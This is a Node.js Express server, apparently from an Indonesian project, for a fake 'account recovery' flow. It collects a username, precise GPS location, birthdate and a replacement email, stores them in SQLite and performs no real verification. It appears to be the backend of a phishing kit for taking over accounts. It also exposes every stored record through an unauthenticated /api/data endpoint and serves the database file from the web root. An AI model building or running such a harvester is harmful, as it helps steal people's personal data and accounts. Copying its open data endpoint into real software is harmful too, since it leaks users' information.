const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static assets from project root
app.use(express.static(path.resolve(__dirname)));

// SQLite Database Connection
const db = new sqlite3.Database(path.resolve(__dirname, 'app_data.db'), (err) => {
  if (err) {
    console.error('Database connection failed:', err.message);
  } else {
    console.log('Connected to SQLite app_data.db');
  }
});

// Ensure tables and columns exist with local time defaults
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS user_verifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT DEFAULT '',
    region TEXT,
    latitude REAL,
    longitude REAL,
    birthdate TEXT,
    email TEXT,
    submitted_at DATETIME DEFAULT (datetime('now', 'localtime'))
  )`);

  db.all('PRAGMA table_info(user_verifications)', [], (err, columns) => {
    if (err) return console.error('Failed to inspect user_verifications columns:', err.message);
    const colNames = columns.map((c) => c.name);
    if (!colNames.includes('region')) {
      db.run('ALTER TABLE user_verifications ADD COLUMN region TEXT');
    }
    if (!colNames.includes('email')) {
      db.run('ALTER TABLE user_verifications ADD COLUMN email TEXT');
    }
  });

  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    email TEXT,
    created_at DATETIME DEFAULT (datetime('now', 'localtime'))
  )`);
});

// Health Check Endpoint
app.get('/api/health', (req, res) => {
  res.json({ message: 'Terhubung (Online)' });
});

// Step 1: Username / Account Recovery Start
app.post('/api/account', (req, res) => {
  const username = req.body.username || '';
  db.run(
    "INSERT INTO user_verifications (username, submitted_at) VALUES (?, datetime('now', 'localtime'))",
    [username],
    function (err) {
      if (err) {
        console.error('Error creating verification session:', err.message);
        return res.status(500).json({ error: err.message });
      }
      const id = this.lastID;
      if (req.headers.accept && req.headers.accept.includes('application/json')) {
        return res.json({ id, redirect: `/views/verificationlocate.html?id=${id}` });
      }
      res.redirect(`/views/verificationlocate.html?id=${id}`);
    }
  );
});

// Step 2: Location Verification
app.post('/api/locate', (req, res) => {
  const { id, latitude, longitude, region } = req.body;
  const lat = latitude ? parseFloat(latitude) : null;
  const lng = longitude ? parseFloat(longitude) : null;
  const reg = region || (lat && lng ? `Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}` : '');

  if (id) {
    db.run(
      "UPDATE user_verifications SET latitude = ?, longitude = ?, region = ?, submitted_at = datetime('now', 'localtime') WHERE id = ?",
      [lat, lng, reg, id],
      function (err) {
        if (err) console.error('Error updating location:', err.message);
        if (req.headers.accept && req.headers.accept.includes('application/json')) {
          return res.json({ id, redirect: `/views/birthday.html?id=${id}` });
        }
        res.redirect(`/views/birthday.html?id=${id}`);
      }
    );
  } else {
    db.run(
      "UPDATE user_verifications SET latitude = ?, longitude = ?, region = ?, submitted_at = datetime('now', 'localtime') WHERE id = (SELECT MAX(id) FROM user_verifications)",
      [lat, lng, reg],
      function (err) {
        if (err) console.error('Error updating location:', err.message);
        if (req.headers.accept && req.headers.accept.includes('application/json')) {
          return res.json({ redirect: '/views/birthday.html' });
        }
        res.redirect('/views/birthday.html');
      }
    );
  }
});

// Step 3: Birthday Verification
app.post('/api/birthday', (req, res) => {
  const { id, birthdate } = req.body;
  const bdate = birthdate || '';

  if (id) {
    db.run(
      "UPDATE user_verifications SET birthdate = ?, submitted_at = datetime('now', 'localtime') WHERE id = ?",
      [bdate, id],
      function (err) {
        if (err) console.error('Error updating birthday:', err.message);
        if (req.headers.accept && req.headers.accept.includes('application/json')) {
          return res.json({ id, redirect: `/views/newemail.html?id=${id}` });
        }
        res.redirect(`/views/newemail.html?id=${id}`);
      }
    );
  } else {
    db.run(
      "UPDATE user_verifications SET birthdate = ?, submitted_at = datetime('now', 'localtime') WHERE id = (SELECT MAX(id) FROM user_verifications)",
      [bdate],
      function (err) {
        if (err) console.error('Error updating birthday:', err.message);
        if (req.headers.accept && req.headers.accept.includes('application/json')) {
          return res.json({ redirect: '/views/newemail.html' });
        }
        res.redirect('/views/newemail.html');
      }
    );
  }
});

// Step 4: New Email Submission
app.post('/api/newemail', (req, res) => {
  const { id, newEmail } = req.body;
  const email = newEmail || '';

  if (id) {
    db.run(
      "UPDATE user_verifications SET email = ?, submitted_at = datetime('now', 'localtime') WHERE id = ?",
      [email, id],
      function (err) {
        if (err) console.error('Error updating email:', err.message);
        if (req.headers.accept && req.headers.accept.includes('application/json')) {
          return res.json({ id, redirect: '/views/pending.html' });
        }
        res.redirect('/views/pending.html');
      }
    );
  } else {
    db.run(
      "UPDATE user_verifications SET email = ?, submitted_at = datetime('now', 'localtime') WHERE id = (SELECT MAX(id) FROM user_verifications)",
      [email],
      function (err) {
        if (err) console.error('Error updating email:', err.message);
        if (req.headers.accept && req.headers.accept.includes('application/json')) {
          return res.json({ redirect: '/views/pending.html' });
        }
        res.redirect('/views/pending.html');
      }
    );
  }
});

// Database API Routes
app.get('/api/data', (req, res) => {
  db.all('SELECT * FROM user_verifications ORDER BY id DESC', [], (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json({ data: rows });
  });
});

app.post('/api/data', (req, res) => {
  const { name, email } = req.body;
  db.run(
    "INSERT INTO users (name, email, created_at) VALUES (?, ?, datetime('now', 'localtime'))",
    [name, email],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ id: this.lastID });
    }
  );
});

// Listen on API port
app.listen(PORT, () => {
  console.log(`API/DB Server running on http://localhost:${PORT}`);
});
